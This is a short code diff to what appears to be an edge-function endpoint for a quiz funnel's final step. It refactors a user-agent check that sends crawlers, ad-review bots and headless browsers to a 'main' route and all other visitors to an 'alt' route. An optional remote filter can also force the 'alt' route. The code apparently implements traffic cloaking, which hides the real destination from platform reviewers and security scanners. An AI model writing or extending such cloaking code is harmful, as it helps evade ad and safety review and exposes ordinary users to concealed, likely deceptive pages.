@@ -1,10 +1,9 @@
 /**
- * Handoff check endpoint — accepts the browser fingerprint POST and returns
- * a route decision for the quiz final step.
- *
- * Optional: set CHECK_UPSTREAM to a remote filter URL that returns JS/text;
- * responses with a navigation assignment are treated as route "alt".
+ * Handoff check — returns { route: "main"|"alt" } only. Never returns money URLs.
+ * Optional CHECK_UPSTREAM: nav signal in body ⇒ alt.
  */
+import { isBotLike } from "../_lib/bot.js";
+
 export async function onRequestPost(context) {
   const { request, env } = context;
   const headers = {
@@ -45,14 +44,8 @@ export async function onRequestPost(context) {
     }
   }
 
-  const botLike =
-    !ua ||
-    /(bot|spider|crawl|slurp|facebookexternalhit|facebot|twitterbot|linkedinbot|pinterest|embedly|quora|whatsapp|telegrambot|applebot|bingpreview|yandex|semrush|ahrefs|petalbot|adsbot|google-inspection|headless|phantom|selenium|puppeteer)/i.test(
-      ua
-    );
-
   return new Response(
-    JSON.stringify({ route: botLike ? "main" : "alt", via: "edge" }),
+    JSON.stringify({ route: isBotLike(ua) ? "main" : "alt", via: "edge" }),
     { headers }
   );
 }
